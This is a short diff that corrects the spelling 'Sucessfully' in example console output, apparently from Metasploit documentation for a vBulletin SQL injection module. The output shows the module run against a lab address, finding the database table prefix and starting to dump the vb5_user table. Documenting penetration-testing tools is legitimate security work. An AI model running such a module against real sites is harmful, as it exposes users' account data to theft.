@@ -78,9 +78,9 @@ msf5 auxiliary(gather/vbulletin_getindexablecontent_sqli) > run
 
 [*] Running module against 192.168.1.100
 [*] Brute forcing to find a valid node id.
-[+] Sucessfully found node at id 1
+[+] Successfully found node at id 1
 [*] Attempting to determine the vBulletin table prefix.
-[+] Sucessfully retrieved table to get prefix from vb5_language.
+[+] Successfully retrieved table to get prefix from vb5_language.
 [*] Getting table columns for vb5_user
 [+] Retrieved 78 columns for vb5_user
 [*] Dumping table vb5_user
